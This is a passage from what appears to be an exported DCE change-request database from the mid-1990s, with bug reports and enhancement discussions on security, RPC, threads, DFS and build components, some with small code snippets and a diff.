Well, the code has been fixed for a while now to use a 1024 buffer instead of
256, so the problem no longer exists...  I've changed this to an enhancement
request that acl_edit not have this hard limit, in case future changes would
exceed 1024 chars.  I assume it might not be implemented in acl_edit, since
acl_edit will eventually go away completely once people stop using it in favor
of dcecp, but I wanted to leave this as an open enh CR so that vendors would 
know that they could make this change if they felt that acl_edit was going to
be in use for a long enough period of time to warrant working on this...

[7/14/94 public]
Moved to dcecp component for Howard to look at prior to setting status
to defer to 1.2  (dcecp now performs most functions of the control programs)

[7/15/94 public]
Moved back to sec/enhancement for reasons described by Mike above.

[7/15/94 public]
Just to confirm. This doesn't apply to dcecp acl support.

[8/1/94 public]
All control program bugs are being changed to E4 due to the existance
of dcecp.



CR Number                     : 10498
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : krb5
Short Description             : krb5_lock_file returns errno
Reported Date                 : 5/2/94
Found in Baseline             : 1.0.2
Found Date                    : 5/2/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : ktf_util.c,others?
Sensitivity                   : public

[5/2/94 public]
    In dce102, sec_key_mgmt_get_key() can and does return (undocumented)
system error codes when the supplied keyfile (arg) does not refer to an
extant file, or when a lock conflict is encountered.
    Comparing this against the 103 sources, this problem still exists.
While one obvious workaround is to add a call to ktf_convert() within
krb5_ktfileint_openr() and krb5_ktfileint_open(), this does not address
the situation where fcntl() (in krb5_lock_file()) has returned EAGAIN.
In this case, the OSF base code should either convert that error into a
KRB error code, or take some action to retry the lock. There are pros
and cons for both approaches, so I haven't gone and tried either; I hope
to learn what the OSF base product will do in this case.



CR Number                     : 10473
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : interface changes for dce_svc_routing and dce_svc_debug_routing
Reported Date                 : 4/28/94
Found in Baseline             : 1.1
Found Date                    : 4/28/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/28/94 public]

On February 10th a change of the interfaces dce_svc_routing and
dce_svc_debug_routing was announced, however it is not yet in the
source.

[4/28/94 public]

Please note that I proposed a change to the proposed change :-).
(I can't recall whether I sent this to Rich S only or to dce-tech ). 

Proposal on Feb 10th:

    As mentioned in the tech call minutes, security needs to be able to
    temporary "push" a new serviceability routing, log some data, and then
    restore it.  I think the best way to handle this is to change the API
    to look like this:

	extern void dce_svc_routing(
	    unsigned char*		/* where */,
	    unsigned char**		/* old_value */,	<<NEW
	    error_status_t*		/* status */
	);


	void dce_svc_debug_routing(
	    unsigned char*		/* where */,
	    unsigned char**		/* old_value */,	<<NEW
	    error_status_t*		/* status */
	);

    If not NULL, then old_value will be given a malloc'd string that represents
    the current routing.  In the case where no routing has been set, the
    functions will build up fake strings that represent the default.

    Comments, complaints?
	/r$

I thought the following would be useful.

   if where is NULL, then return previous value of routing in old_value
   but don't set the routing. If no routing set then return fake strings 
   that represent the default (just like you are doing above).

   This is useful when trying to determine current routing but no
   changes are to be made to the routing. Any problems with this ?

[09/07/94 public]
This is not going to happen for 1.1.  In a future release there should
be a function that gives you the current route (or debug routes) and
then the push/pop model originally requested can be built on top of
that.



CR Number                     : 10471
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : cache manager
Short Description             : cm needs to be more configurable
Reported Date                 : 4/27/94
Found in Baseline             : 1.1a
Found Date                    : 4/27/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[4/27/94 public]
The cache manager should be more configurable.  At this point I know of
one additional configuration paramter -- the size of ACL cache.  An
ACL cache entry "struct cm_aclent" is used to hold ACL information about
cached files.  This structure is a few dozen bytes and 600 of these
are osi_Alloc'ed, regardless of the size of the client.  The proposal
is to make this another field in the cm_cacheparams structure.  dfsd
should be modified to pass this parameter, and some appropriate
switch added to dfsd.

[4/27/94 public]
Filled in Interest List CC with `jeff@transarc.com' 
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 10445
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : cds uses DTS internals inappropriately
Reported Date                 : 4/22/94
Found in Baseline             : 1.1
Found Date                    : 4/22/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/22/94 public]

formatts.c calls the internal DTS function utc_settdf(), which is not part
of the exported API. In addition, cds contains a large number of routines
that appear to contain virtually identical code to DTS routines for 
the manipulation of time values



CR Number                     : 10442
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : enabling DCE privacy, etc
Reported Date                 : 4/22/94
Found in Baseline             : 1.1b7, 1.2
Found Date                    : 4/22/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/22/94 public]
It would be nice to let dcecp users do things using DCE privacy, etc.
To do this, every time dcecp creates a binding handle it would have to
know when to call rpc_binding_set_auth_info (or dced_binding_set_auth_info)
(and, presumably, rpc_mgmt_inq_server_princ_name first).

Here is an idea on how to do it.  Create global variables in dcecp
C that start out as rpc_c_protect_level_none and rpc_c_autn_none.
Every dcecp source code that creates a binding looks at those variables
and, if not set to non, does the set_auth_info.  You could encapsulate
this in a call, of course
	rpc_ns_binding_import_next(..., &bh, ...);
	rpc_ns_binding_import_done(...);
	dcecp_binding_set_auth_info(bh, &st);
Where dcecp_binding_set_auth_info does the work mentioned in the first
paragraph.  Or whatever seems right -- the dcecp folks can figure it out.

The next question is how to bubble this up to the user.  There are two
ways.  Either create new global variables that the user can set (and
use a TCL write trace) or create a new command that the user can call.
That is, either
	set binding_auth_info { pkt_privacy authn_default }
or
	dcecp binding_auth -modify { pkt_privacy authn_default }
You'd also need a "get" switch here, whereas you wouldn't if you just
used a variable.  I'm not sure which is better for users; I expect that
use TCL write traces will make catching bad values harder for the dcecp
code.

[7/11/94 public]
Now a defect.  dced's keytab operations (and therefore dcecp's keytab
object) will need this functionality.  See dced code CR 11201.

[7/11/94 public]
Currently dcecp's keytab code calls dced_binding_set_auth_info to set 
the protect level to pkt_privacy if user is dce_login-ed, otherwise it
assumes unauthenticated access.  This also means that unauthenticated 
access is only allowed to a dced which is started with '-c' option.

[9/1/94 public]
We will not solve this generically in DCE 1.1.  There is a section of RFC
42.3 that describes choices to make to implement an _a convenience variable
for a generic mechanism.  In the mean time, only keytab *needs* this for
DCE 1.1.  Here is the updated spec:

  Key tables store server keys which is sensitive information.  It would be a
  security hole for unauthorized users to obtain this information.  As such,
  the RPC calls used for these operations uses RPC Privacy (i.e., DES
  encryption) for all the data by default.  This is not always possible
  (e.g., due to encryption export and use laws in various countries).  All of
  the following commands accept a "-noprivacy" option to use the default
  protection level instead.  This option will probably be deprecated in
  future releases in favor of a more general mechanism that allows control of
  all binding handles used by "dcecp".  See the "Changes for Future Versions"
  section for a description of the "_a" convenience variable.

This be implemented for all keytab commands.

[9/6/94 public]
Submitted the fix for 1.1 and defer this ot to 1.2 for the generic fix.

[6/5/96 public]
Moved from 'defer' to 'open', but severity and priority lowered
to reflect the fact that it's been sitting here for quite a while
as 'defer', and nobody cared.



CR Number                     : 10437
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : test
Short Description             : crvb_exc_002 and prvb_exc_002
should be removed from src/test/threads/runtest.
Reported Date                 : 4/21/94
Found in Baseline             : 1.0.3
Found Date                    : 4/21/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/test/threads/runtest
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/21/94 public]

  Since crvb_exc_002 and prvb_exc_002 are not built in the 
 Makefile, they should be removed from the runtest script as
 well.



CR Number                     : 10369
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : kernel threads
Short Description             : cma__sem_timed_wait fails for
very long intervals
Reported Date                 : 4/15/94
Found in Baseline             : 1.0.3
Found Date                    : 4/15/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : .../src/threads/cma_semaphore,c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/15/94 public]

 If _CMA_THREAD_IS_VP_ is true, that is, in the case of kernel threads,
very long waits in cma__sem_timed_wait return immediately because the
calculation of the delta overflows and returns a negative value. The
problem appears when the timeout is approximately 23 days. The code in
question is the following:

#if _CMA_THREAD_IS_VP_
        cma__get_time (&current);
        cma__subtract_time (&delta, timeout, &current);
# if _CMA_OS_ == _CMA__VMS
        /*
         * FIX-ME:
         *
         * Need to implement this before supporting VMS kernel threads
         */
        this doesn't matter since vms doesn't have kernel threads!!!
# else
        delta_ms = ((delta.tv_sec * 1000) + ((delta.tv_usec + 999) /
1000));
# endif

        if (delta_ms <= 0)
            value = cma_c_false;        /* Instant timeout */
        else
            value = cma__block (&semaphore->queue, delta_ms);

#else

specifically, the conversion of delta.tv_sec to milliseconds in the
calculation of delta_ms. The customer included a suggested fix in his
service ticket.



CR Number                     : 10356
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : ptdexc_signal_cancel_np
Short Description             : unlike pthread_to_signal_np,
ptdexc_signal_cancel_np does not return a status
Reported Date                 : 4/14/94
Found in Baseline             : 1.0.3
Found Date                    : 4/14/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : .../src/threads/cma_ptd_exc.c,
					     .../src/threads/pthread_exc.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/14/94 public]

 pthread_signal_to_cancel_np returns a status value signifying success or
 failure. ptdexc_signal_to_cancel_np is declared as a void routine and
 does not return any value. This is particularly troublesome because
 pthread_signal_to_cancel_np is defined as ptdexc_signal_to_cancel_np
 when pthread_exc.h is included in a file in place of pthread.h.



CR Number                     : 10344
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : cma_init.c
Short Description             : debug code in cma_init.c doesn't maintain mutex table properly
Reported Date                 : 4/13/94
Found in Baseline             : 1.0.2
Found Date                    : 4/13/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cma_init.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
OB                            : 

[4/13/94 public]
 The cma___g_dbg_libcr_c counter is never decremented, only
 incremented.  That means if 1024 mutexes are created and then
 destroyed, the counter will overflow and trip an assert in
 cma___mutex_create. 
 
 The fix is easy enough; when a mutex_destroy is done, copy the last
 entry in the table into the newly-vacant slot and decrement the
 counter by 1.
 
Related-file::Added 931208 by wright::
/build/hiosfm/RCS/src/dce/src/threads/./c
ma_init.c,v 7.5
 /build/hiosfm/RCS/src/dce/src/threads/./cma_init.c,v 7.5
 wright 1993/12/08 19:10:29 +3 -3
 Reason:  OSDqa06763 mutex debug table can improperly overflow
 When removing table entry, put last entry into vacated spot.
 
     *** /tmp/ci.15985..cma_init.c.16012.1      Wed Dec  8 14:10:32 1993
     --- /tmp/cma_init.c.16012.2        Wed Dec  8 14:10:32 1993
     ***************
     *** 845,855 ****
           cma__int_lock (cma___g_dbg_libcr_m);
       
           for (i = 0; i < cma___g_dbg_libcr_c; i++) {
       
        if (cma___g_dbg_libcr_v[i] == *mutex) {
     !      cma___g_dbg_libcr_v[i] = (lib_mutex_t)0;
            done = cma_c_true;
            break;
            }
       
        }
     --- 845,855 ----
           cma__int_lock (cma___g_dbg_libcr_m);
       
           for (i = 0; i < cma___g_dbg_libcr_c; i++) {
       
        if (cma___g_dbg_libcr_v[i] == *mutex) {
     !      cma___g_dbg_libcr_v[i] = cma___g_dbg_libcr_v[--cma___g_dbg_libcr_c];
            done = cma_c_true;
            break;
            }
       
        }



CR Number                     : 10333
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : dg
Short Description             : enhanced dg support for auto-started servers
Reported Date                 : 4/12/94
Found in Baseline             : 1.1b6
Found Date                    : 4/12/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/12/94 public]

It would be nice to enhance the RPC DG code to better support auto-started
servers.  In particular, while dced is waiting for a server to start the
client could time-out and give up.  Mark Karuzis noted that we could take
advantage of the current RPC DG implementation by having dced return a
nocall packet with a boot-time of 0 and add new semantics to this that mean
"binding in progress."  Pre-1.0.3 clients will see the nocall and eventually
time-out.  1.0.3 clients will see the packet, NOT timeout, and NOT update
their binding handle.  1.1 clients will see the backet, note the call is
being routed, and not update the binding.

In other words, it seems to be the right thing for 1.0.3 and later,
and pre-1.0.3 clients will timeout which is not the wrong thing.



CR Number                     : 10300
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11252
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : gds
Subcomponent Name             : libs
Short Description             : GDS builds libraries unnecessarily
Reported Date                 : 4/5/94
Found in Baseline             : 1.1
Found Date                    : 4/5/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/5/94 public]
When building GDS with libdce, some individual libraries which are
components of GDS are built despite the fact that they are in libdce.
(Hence, they shouldn't be used independently.)

They are:	libasn1.a
		libdua.a
		libdua_r.a
		libd21sw.a
		libslog.a
		libXDS.a
		libXOM.a
		libxoms.a

[04/06/94 public]

We want to build these libraries because:

In the phase of developing and testing you often need to debug.
Debuggers like xdb (HP) and dbx (RIOS) have difficulties with
debugging shared libraries (libdce). So many developers
link there processes with the static libraries (in there sandbox).
That means that the libraries should be built in the common backing tree.

I propose that we change the Makefiles (dua, xds, ...) just before the
code freeze. I will take responsibility for that.

[6/20/94 public]
A licensee has requested that there be an option to build either static
libraries or use the dynamic APIs in libdce.so.

[07/11/94 public]
Opened OT 11252 to get the option Rich has described above.



CR Number                     : 10295
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : dce_login
Short Description             : dce_login -e should purge creds when done
Reported Date                 : 4/5/94
Found in Baseline             : 1.0.3
Found Date                    : 4/5/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/dce_login/dce_login.c
Sensitivity                   : public

[4/5/94 public]
dce_login -e may exec a shell script or binary, with the credentials that it
creates.  It should purge these when done (the script or binary shouldn't
have to know to do it; the -e option was added so that they wouldn't have to
know to log in...).   Not doing this means that a lot of tests using this
option will  not be able to clean up creds and thus fill your disk (preventing
any real scalability testing...).

[4/5/94 public]
Oops, as Greg pointed out, dce_login is doing an exec of the -e'd binary
so it's not going to be around to clean up the credentials when the binary
is done.  Cancelled this CR.

[4/5/94 public]
Yo yo time...  I was misinformed, dce_login can and does call fork in the
normal case, so it should be able to clean up when the child exits (both in
the normal case and in the -e case).  Cancelled the cancel (reopened it).



CR Number                     : 10267
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : rgy_edit
Short Description             : rgy_edit ask for passwd just once
Reported Date                 : 4/1/94
Found in Baseline             : 1.1b3
Found Date                    : 4/1/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/1/94 public]
Rgy_edit ktadd asks for the user's password twice (to guard against the
"unattended seat" attack).  It needs to ask for that password only once.

[6/6/94 public]

"unattended seat" attack?  Huh?

The double-entry is to guard the liklihood of "stupid typo" during entry.

ktadd puts a copy of the password you typed in key-crunched form into the
file.

It does not check the key against the registry; if you get the password
wrong at that point, it will just put garbage in the file.



CR Number                     : 10266
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 7293
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : obscure authentication failure status.
Reported Date                 : 3/31/94
Found in Baseline             : 1.0.3
Found Date                    : 3/31/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/31/94 public]

Here is 1) an instance of a obscure error status returned by the runtime 2)
an instance where the error status reported by the runtime depends on the
protocol. Isn't RPC supposed to present to the programmer an abstraction
independent of protocols (see discussion in 7293)?

1) If a service ticket held by a client was derived using a key no longer
available to the server (say an administrator inadvertently deleted an old
version of the server key from the keytab file) an authenticated rpc from
that client will fail with status rpc_s_unknown_reject over ncacn_ip_tcp
and rpc_s_comm_failure over ncadg_ip_udp. Neither status is helpful.
Actually I had a hard time tracking down a CDS problem because of the lack
of information conveyed by the rpc status in this situation. Isn't the
"right" thing to do to have the runtime return the same HELPFUL status in
this situation (e.g.  rpc_s_auth_bad_integrity or a catchall status for
authentication problems)?

2) rpc_mgmt_is_server_listening returns rpc_s_server_too_busy over
ncacn_ip_tcp and rpc_s_comm_failure over ncadg_ip_udp when the call queue
is full. The rpc_s_server_too_busy status is certainly useful and accurate.
Isn't the "right" thing to do to have ncadg_ip_udp return that same status?

[7/8/94 public]

In the above case 1), DG now returns rpc_s_who_are_you_failed instead of
rpc_s_comm_failure, which was fixed in CR 10444.

[8/26/94 public]

In the above case 2), the DG server runtime simply drops the request
packet. This has some advantage over CN if the call queue full status is
transient because the automatic re-xmit of the request by the client
runtime may succeed. (In CN, the client application itself must retry or
find another server.) If we are going to retain this advantage, it's
difficult to decide when we return the rpc_s_server_too_busy status.
(Probably, the only way to implement this is the use of the packet's serial
number.)

[2/7/96 public]

Making this enhancement request.



CR Number                     : 10261
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dfs
Subcomponent Name             : dfs plumber
Short Description             : enhancement for dfs plumber
Reported Date                 : 3/31/94
Found in Baseline             : 1.1
Found Date                    : 3/31/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/31/94 public]

The dfs core component's dfs plumber system call should be enhanced to 
return summary information and osi allocation record information.  The
PC values are also needed and so osi_caller (function that gives
you the address of the caller of the caller) should be written.  A
user interface program that maps the PC values to the nearest preceding
function symbol using the kernel symbol table is also needed.

The goal is to have a tool which can be used to analyze memory usage
patterns and ultimately (at least for clients) reduce memory consumption.



CR Number                     : 10258
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : 
Short Description             : Need TRY/CATCH blocks for non-fault/comm_status exceptions
Reported Date                 : 3/31/94
Found in Baseline             : 1.0.3
Found Date                    : 3/31/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]
lowering priority of old OTs that haven't appeared during R1.2.
Transarc Deltas                      [text]: 
Transarc Herder                      [text]: 
Transarc Status                      [text]: open

[3/31/94 public]
Opening this defect as a result of discussions related to
OT9931.

There appear to be some RPC exceptions which cannot be
converted to either comm_status or fault_status.  To handle
these we need TRY/CATCH blocks, maybe in the main routine
of the effected commands is enough once all the fault_status
comm_status changes are in.  OT9931 only addresses the idl
files which are missing fault_status or comm_status, I think
this is a broader issue which hits more of the DFS commands/
servers.

The test scenario used in the case of the bos command was
to send a -cmd parameter to the bos create command that 
was longer than 256 characters.  Even with fault/comm_status
in, the command core dumped:

Exception: status 16c9a07d (dce / rpc) (= rpc_s_fault_invalid_bound)
Abort(coredump)

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `open'



CR Number                     : 10218
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : add support for dynamic thread pools
Reported Date                 : 3/23/94
Found in Baseline             : 1.1
Found Date                    : 3/23/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/23/94 public]

The thread pool facility should provide a way to dynamically 
allocate server call threads to meet occasional peak needs.

As an example of when this functionality would be useful, consider the
auto-start capability of the dced:  It's now possible that each
resolve-endpoint call made by a client could result in the spawning of
a server process.  This new server process will need an indeterminate
amount of time to initialize itself before delivering its endpoints
to the dced, which then completes the original resolve-endpoint call.

While waiting for the endpoints, one of the dced's call threads is being
tied up.  In the worst case, all of the call threads are waiting for
servers to start-up, and all of the spawned servers are blocked waiting
for the results of RPCs that *they've* made as part of *their*
initialization; in this case, the CPU is idle, but new calls to the dced
can't be started.

Note that this problem is not isolated to the dced. 

One way to avoid this is for the server to call rpc_server_listen() with
max_calls set to the largest number of concurrent requests it expects to
see.   There are two problems with this approach.  First, in most cases
there's no way to determine what the right number is.  And second, in the
case where the server never actually needs the extra threads (which may
be most of the time) it shouldn't have to pay for them.

A more reasonable solution would be to allow the server to create the
normal default pool (which caches a moderate number of live threads),
*and* a dynamic thread pool that can expand if necessary.

The new (private) API call would look something like this:

/*
 * R P C _ S E R V E R _ C R E A T E _ D T H R E A D _ P O O L
 *
 * Create a dynamic pool initially containing "min_threads" threads to
 * execute incoming RPC requests.  If calls are targeted to this pool,
 * and all threads are in use, new threads will be created, up to a
 * maximum of "max_threads".
 *
 * Specifying a max_threads value of 0 indicates that the thread pool
 * has no upper bound (and should be used with caution).
 *
 * Return a handle onto that pool. The pool exists until the pool is
 * freed; the pool's initial threads are created when rpc_server_listen()
 * is called, and all of its threads are destroyed when rpc_server_listen()
 * returns.
 */
void rpc_server_create_dthread_pool
(
    [in]        unsigned32              min_threads,
    [in]        unsigned32              max_threads,
    [out]       rpc_thread_pool_handle_t *phandle,
    [out]       unsigned32              *status
);


Note that this functionality is specifically *not* intended as a general
deadlock prevention mechanism.  It would be a bad idea for developers to rely
solely on the dynamic creation of resources to avoid deadlock scenarios.



CR Number                     : 10182
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : utils
Subcomponent Name             : sams
Short Description             : attributes message does not allow "|"
Reported Date                 : 3/18/94
Found in Baseline             : 1.1
Found Date                    : 3/18/94
Severity                      : E
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/18/94 public]
When I tried to use multiple attributes on this line it failed.
You are only allowing a single tID token, if I am interpreting
the yacc file correctly.

[03/29/94 public]
You're sort-of interpreting the grammar right.  You CAN do this:
	attributes "svc_c_sev_fatal | svc_c_action_exit_bad"
A "tID" token can be a text string.

It might be useful to have sams check the contents of the attribute
field, but I am worried about strict compliance with vendor-value-added
fields (e.g., if a licensee adds
	#define svc_c_action_hcf svc_c_actroute_vendor1
to their dce_svc.h, SAMS users on that platform should be able to generate
"halt and catch fire" routings if they want.)

I'm going to cancel this.  I'm would not put up too much fuss if it
were re-opened, but I'd probably defer it.

[02/06/96 public]
Redefined as Enh Req.



CR Number                     : 10180
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : osf.dce.mk
Short Description             : DCELOCAL, etc
Reported Date                 : 3/18/94
Found in Baseline             : 1.1b4
Found Date                    : 3/18/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/18/94 public]

These lines should not be in osf.dce.mk.  I don't know what would break
if they were removed, but they should go:
    DCESHARED_PATH=/opt/dce
    DCELOCAL_PATH=/opt/dcelocal
    DCEPATHS ?= -DDCESHARED_PATH=\"/opt/dce\" -DDCELOCAL_PATH=\"/opt/dcelocal\"

[3/18/94 public]
Well, here's an idea of what would break.  These are the makefiles which
reference any one of the three above values:

./admin/dced/server/Makefile
./directory/gds/adm/adm_iapl/Makefile
./directory/gds/adm/admin/Makefile
./directory/gds/adm/delupd/Makefile
./directory/gds/adm/usradmin/Makefile
./directory/gds/cache/Makefile
./directory/gds/cacheadm/adm_iapl/Makefile
./directory/gds/cacheadm/admin/Makefile
./directory/gds/cacheadm/delupd/Makefile
./directory/gds/dsa/Makefile
./directory/gds/dua/lib/Makefile
./directory/gds/dua/lib_r/Makefile
./directory/gds/ipc/Makefile
./directory/gds/nds/Makefile
./directory/gds/osiadr/Makefile
./directory/gds/stub/RIOS/machdep.mk
./directory/gds/stub/Makefile
./directory/xoms/Makefile
./diskless/dl_init/Makefile
./diskless/uninteg/dl_init/Makefile
./file/AT386/machdep.mk
./file/HP800/machdep.mk
./file/PMAX/machdep.mk
./file/RIOS/machdep.mk
./lbe/mk/osf.dce.mk
./rpc/rpcd/Makefile
./security/client/acl/Makefile
./security/client/admin/acl_edit/svr_example/Makefile
./security/client/admin/acl_edit/Makefile
./security/client/admin/passwd_export/Makefile
./security/client/admin/passwd_import/Makefile
./security/client/admin/rgy_edit/Makefile
./security/client/admin/sec_admin/Makefile
./security/client/dce_login/Makefile
./security/client/rca/Makefile
./security/helper/Makefile
./security/server/bin/Makefile
./security/server/rrs/Makefile
./security/server/rs/Makefile
./security/server/rsdb/Makefile
./security/server/sec_clientd/Makefile
./security/server/sec_salvage_db/Makefile
./security/utils/Makefile
./test/directory/gds/ros/testenv/Makefile
./test/security/commands/rgy/Makefile
./test/systest/security/sec.rgy.7/Makefile
./time/libutc/kernel/RIOS/machdep.mk
./time/libutc/user/Makefile

[03/18/94 public]
I was over-zelous with cut&paste.  The line that should go is this one:
    DCEPATHS ?= -DDCESHARED_PATH=\"/opt/dce\" -DDCELOCAL_PATH=\"/opt/dcelocal\"
Since for code cleanup these become global variables not constants.

[ damon 08/26/96 public]

Unless this really needs to be addressed for 1.2.2, I'd like to defer this.



CR Number                     : 10163
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : backing store
Short Description             : dce_db_free() not implemented
Reported Date                 : 3/17/94
Found in Baseline             : 1.1b0
Found Date                    : 3/17/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/17/94 public]
dce_db_free() is not implemented.  There is no reasonably easy way
to free all the memory allocated by the encoding services (and it may
not be possible at all).

It is not worth doing all the work because in almost all cases,
